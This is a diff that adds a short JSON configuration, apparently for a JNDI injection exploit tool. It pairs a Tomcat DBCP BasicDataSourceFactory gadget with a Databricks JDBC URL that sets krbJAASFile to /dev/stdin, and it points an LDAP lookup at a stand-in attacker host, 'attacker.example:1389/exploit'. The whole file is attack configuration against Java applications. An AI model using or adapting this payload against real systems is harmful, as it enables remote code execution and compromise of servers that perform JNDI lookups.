@@ -1,0 +1,12 @@
+{
+    "attack_type": "jndi_factory",
+    "factory_class": "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
+    "reference_class": "javax.sql.DataSource",
+    "factory_attrs": {
+        "url": "jdbc:databricks://host;krbJAASFile=/dev/stdin",
+        "driverClassName": "com.databricks.client.jdbc.Driver"
+    },
+    "sink_type": "jdbc_databricks_jaas",
+    "protocol": "ldap",
+    "lookup_url": "ldap://attacker.example:1389/exploit"
+}
